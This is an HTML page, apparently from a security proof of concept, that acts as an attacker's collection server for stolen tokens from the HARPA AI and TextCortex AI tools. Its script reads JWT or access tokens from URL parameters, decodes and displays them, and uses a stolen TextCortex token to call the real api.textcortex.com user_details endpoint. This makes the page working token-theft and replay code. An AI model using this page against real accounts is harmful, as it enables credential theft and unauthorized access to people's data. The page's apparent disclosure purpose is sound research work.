<!DOCTYPE html>
<html>
<head><title>Exfiltrated Data</title></head>
<body style="font-family:monospace; background:#1a1a2e; color:#0f0; padding:20px; min-height:100vh;">
<h1 style="color:#e94560;">Attacker's Collection Page - Data Received!</h1>
<p>This page simulates the attacker's server receiving stolen credentials.</p>
<h2>Received Data:</h2>
<pre id="data" style="background:#16213e; padding:15px; word-break:break-all; color:#e94560; border:1px solid #0f3460;"></pre>

<div id="api-results" style="display:none;">
<h2 style="color:#ffaa00;">API Data Retrieved With Stolen Token:</h2>
<pre id="api-data" style="background:#16213e; padding:15px; word-break:break-all; color:#0f0; border:1px solid #0f3460;"></pre>
</div>

<script>
(async function() {
  var params = new URLSearchParams(window.location.search);
  var jwt = params.get('jwt');
  var accessToken = params.get('access_token');
  var userId = params.get('uid');
  var email = params.get('email');
  var token = jwt || accessToken;

  if (token) {
    var source = jwt ? 'HARPA AI (jwt param)' : 'TextCortex (access_token param)';
    var decoded = null;
    try {
      decoded = JSON.parse(atob(token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));
    } catch(e) {}

    var exfilData = {
      source: source,
      stolen_token: token,
      decoded_payload: decoded,
      user_id: userId || (decoded ? decoded.identity || decoded.id : null),
      email: email || null,
      token_expires: decoded ? new Date((decoded.exp || 0) * 1000).toISOString() : null,
      received_at: new Date().toISOString(),
      attacker_origin: window.location.origin
    };

    document.getElementById('data').textContent = JSON.stringify(exfilData, null, 2);

    // If TextCortex token, demonstrate API access (CORS allows any origin)
    if (accessToken) {
      try {
        var resp = await fetch('https://api.textcortex.com/accounts/user_details', {
          headers: { 'Authorization': 'Bearer ' + accessToken }
        });
        var userData = await resp.json();
        document.getElementById('api-results').style.display = 'block';
        document.getElementById('api-data').textContent = JSON.stringify({
          status: resp.status,
          proof: 'API called from ' + window.location.origin + ' with stolen token',
          user_data: userData
        }, null, 2);
      } catch(e) {
        document.getElementById('api-results').style.display = 'block';
        document.getElementById('api-data').textContent = 'API call error: ' + e.message;
      }
    }
  } else {
    document.getElementById('data').textContent = 'No data received.';
  }
})();
</script>
</body>
</html>
